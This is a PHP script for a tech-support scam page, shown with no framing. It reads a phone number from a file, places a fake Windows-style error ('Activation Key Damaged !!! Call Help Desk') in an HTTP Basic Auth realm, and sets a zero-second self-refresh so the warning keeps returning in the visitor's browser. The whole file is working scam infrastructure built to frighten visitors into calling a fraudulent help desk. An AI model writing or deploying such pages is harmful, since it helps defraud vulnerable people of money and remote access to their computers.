<?php
$myfile = fopen("../number.txt", "r") or die("Unable to open file!");
$phone = fgets($myfile);
//
$phone = trim(preg_replace('/\s\s+/', ' ', $phone));
fclose($myfile);


header('WWW-Authenticate: Basic realm="0x80070424 Warning: Activation Key Damaged !!! Call Help Desk: '.$phone.' "');
header('Location: report1.php');
header('HTTP/1.0 401 Unauthorized');
$page = $_SERVER['PHP_SELF'];
$sec = "0";
header("Refresh: $sec; url=$page");
echo "<html><head><title>Internet Security Damaged !!! Call Help Desk</title></head><body>";
?>
